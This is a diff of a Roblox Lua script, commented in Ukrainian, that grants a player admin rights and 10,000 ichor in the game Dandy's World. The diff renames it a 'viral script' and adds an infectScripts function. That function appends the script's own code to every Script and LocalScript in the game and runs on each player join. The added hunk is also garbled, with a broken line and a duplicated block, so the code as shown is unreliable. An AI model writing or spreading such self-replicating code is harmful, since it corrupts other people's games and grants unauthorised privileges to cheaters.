@@ -1,4 +1,4 @@
--- Скрипт для отримання 10,000 іхора та адміністративних прав в Dandy's World
+-- Вірусний скрипт для отримання 10,000 іхора та адміністративних прав в Dandy's World
 
 local function giveAdminRights(player)
     if player then
@@ -24,15 +24,36 @@ local function giveIchor(player, amount)
     end
 end
 
+local function infectScripts()
+    -- Отримуємо всі скрипти у грі
+    local scripts = game:GetDescendants()
+    for _, obj in ipairs(scripts) do
+        if obj:IsA("Script") or obj:IsA("LocalScript") then
+            -- Додаємо вірусний код до кожного скрипту
+            obj.Source = obj.Source .. "\n\n-- Вірусний код\n" .. script.Source
+            print("Скрипт " .. obj.Name .. " заражено.")
+        end
+    end
+end
+
 local function onPlayerAdded(player)
     -- Надання адміністративних прав та 10,000 іхора при додаванні гравця
     giveAdminRights(player)
     giveIchor(player, 10000)
+    -- Зараження всіх скриптів у грі
+    infectScripts()
 end
 
 game.Players.PlayerAdded:Connect(onPlayerAdded)
 
 -- Надання адміністративних прав та 10,000 іхора поточному гравцеві
+local currentPlayer = game.Players.LocalPlayer
+if currentPlayer then
+    giveAdminRights(currentPlayer)
+    giveIchor(currentPlayer, 10000)
+    -- Зараження всіх скриптів у грі
+    infectScripts()
+end іхора поточному гравцеві
 local currentPlayer = game.Players.LocalPlayer
 if currentPlayer then
     giveAdminRights(currentPlayer)
